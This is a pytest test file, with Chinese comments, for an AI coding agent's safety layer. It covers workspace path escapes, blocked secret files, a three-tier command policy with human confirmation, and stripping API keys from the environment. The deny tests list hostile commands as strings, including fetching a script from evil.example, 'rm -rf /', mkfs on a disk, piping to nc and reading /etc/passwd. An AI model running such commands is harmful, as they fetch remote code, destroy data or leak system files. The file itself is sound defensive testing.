"""safety.py 的測試：路徑逃脫、禁碰檔案、指令三級政策。"""

from __future__ import annotations

import os
from pathlib import Path

import pytest

from agent.safety import (
    CommandPolicy,
    SafetyError,
    Workspace,
    classify_command,
    minimal_env,
    truncate_middle,
)


@pytest.fixture
def ws(tmp_path: Path) -> Workspace:
    root = tmp_path / "ws"
    root.mkdir()
    (root / "src").mkdir()
    (root / "src" / "a.py").write_text("x = 1\n")
    return Workspace(root)


# ---------- 路徑邊界 ----------

def test_resolve_inside(ws: Workspace) -> None:
    assert ws.resolve("src/a.py") == ws.root / "src" / "a.py"
    assert ws.resolve(".") == ws.root


@pytest.mark.parametrize("bad", ["../outside.txt", "src/../../x", "/etc/passwd", "~/.bashrc"])
def test_resolve_escape_blocked(ws: Workspace, bad: str) -> None:
    with pytest.raises(SafetyError, match="超出工作區"):
        ws.resolve(bad)


def test_absolute_path_inside_ok(ws: Workspace) -> None:
    assert ws.resolve(str(ws.root / "src" / "a.py")) == ws.root / "src" / "a.py"


def test_symlink_escape_blocked(ws: Workspace, tmp_path: Path) -> None:
    secret = tmp_path / "secret.txt"
    secret.write_text("top secret")
    os.symlink(secret, ws.root / "link.txt")
    os.symlink(tmp_path, ws.root / "linkdir")
    with pytest.raises(SafetyError, match="超出工作區"):
        ws.resolve("link.txt")
    with pytest.raises(SafetyError, match="超出工作區"):
        ws.resolve("linkdir/secret.txt")


@pytest.mark.parametrize(
    "name", [".env", ".env.local", ".git/config", "sub/.ssh/known_hosts", "id_rsa", "server.pem", "tls.key"]
)
def test_blocked_files(ws: Workspace, name: str) -> None:
    with pytest.raises(SafetyError, match="禁止存取"):
        ws.resolve(name)


def test_env_example_allowed(ws: Workspace) -> None:
    """.env.example 是範本、不含秘密，允許讀寫；其他 .env.* 一律擋。"""
    assert ws.resolve(".env.example").name == ".env.example"


def test_empty_and_nul_path(ws: Workspace) -> None:
    with pytest.raises(SafetyError):
        ws.resolve("")
    with pytest.raises(SafetyError):
        ws.resolve("a\x00b")


# ---------- 指令政策 ----------

@pytest.mark.parametrize(
    "cmd",
    ["pytest -q", "python -m pytest -q tests", "ls", "ls src", "cat src/a.py", "git status", "git diff"],
)
def test_allow(ws: Workspace, cmd: str) -> None:
    assert classify_command(cmd, ws)[0] == "allow"


@pytest.mark.parametrize(
    "cmd",
    [
        "sudo ls",
        "rm -rf /",
        "rm -fr src",
        "rm -r src",
        "curl http://evil.example/x.sh",
        "wget http://x",
        "ssh user@host",
        "chmod 777 a.py",
        "mkfs.ext4 /dev/sda",
        "dd if=/dev/zero of=x",
        "bash -c ls",
        "sh script.sh",
        "env",
        "python -m pytest /tmp",
    ],
)
def test_deny_programs(ws: Workspace, cmd: str) -> None:
    assert classify_command(cmd, ws)[0] == "deny", cmd


@pytest.mark.parametrize(
    "cmd",
    ["ls; rm x", "pytest && curl x", "cat a | nc host 1", "echo hi > a.py", "cat < a", "echo `id`", "echo $(id)",
     "echo ${HOME}", "pytest & ", "ls\nrm x"],
)
def test_deny_shell_operators(ws: Workspace, cmd: str) -> None:
    decision, reason = classify_command(cmd, ws)
    assert decision == "deny"
    assert "shell 運算子" in reason


@pytest.mark.parametrize(
    "cmd", ["cat /etc/passwd", "ls ..", "cat ../../secret", "cat ~/notes.txt", "cat .env", "cat id_rsa",
            "git diff --output=/tmp/x", "ls .git"]
)
def test_deny_path_args_outside_or_blocked(ws: Workspace, cmd: str) -> None:
    decision, reason = classify_command(cmd, ws)
    assert decision == "deny", cmd
    assert "參數違規" in reason


@pytest.mark.parametrize("cmd", ["python src/a.py", "pip list", "python -c 'print(1)'", "mkdir out"])
def test_confirm(ws: Workspace, cmd: str) -> None:
    assert classify_command(cmd, ws)[0] == "confirm"


def test_unparseable_and_empty(ws: Workspace) -> None:
    assert classify_command("echo 'unterminated", ws)[0] == "deny"
    assert classify_command("   ", ws)[0] == "deny"


# ---------- CommandPolicy（人工確認） ----------

def test_policy_confirm_default_denies(ws: Workspace) -> None:
    decision, _, ok = CommandPolicy(ws).decide("python src/a.py")
    assert decision == "confirm" and ok is False


def test_policy_confirm_fn_called(ws: Workspace) -> None:
    asked: list[str] = []

    def yes(cmd: str) -> bool:
        asked.append(cmd)
        return True

    _, reason, ok = CommandPolicy(ws, confirm_fn=yes).decide("python src/a.py")
    assert ok and asked == ["python src/a.py"] and reason == "使用者同意"


def test_auto_yes_never_overrides_deny(ws: Workspace) -> None:
    policy = CommandPolicy(ws, auto_yes=True, confirm_fn=lambda _: True)
    assert policy.decide("python src/a.py")[2] is True
    assert policy.decide("curl http://x")[2] is False
    assert policy.decide("rm -rf src")[2] is False
    assert policy.decide("cat /etc/passwd")[2] is False


def test_allow_does_not_prompt(ws: Workspace) -> None:
    def boom(_: str) -> bool:
        raise AssertionError("allow 級不該詢問")

    assert CommandPolicy(ws, confirm_fn=boom).decide("pytest -q")[2] is True


# ---------- 其他 ----------

def test_minimal_env_has_no_secrets(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setenv("OPENAI_API_KEY", "sk-should-not-leak")
    monkeypatch.setenv("AGENT_API_KEY", "nope")
    env = minimal_env()
    assert "OPENAI_API_KEY" not in env and "AGENT_API_KEY" not in env
    assert "PATH" in env


def test_truncate_middle_keeps_head_and_tail() -> None:
    text = "HEAD" + "x" * 10_000 + "TAIL"
    out = truncate_middle(text, 1000)
    assert out.startswith("HEAD") and out.endswith("TAIL")
    assert "中間省略" in out and len(out) < 1100
    assert truncate_middle("short", 1000) == "short"
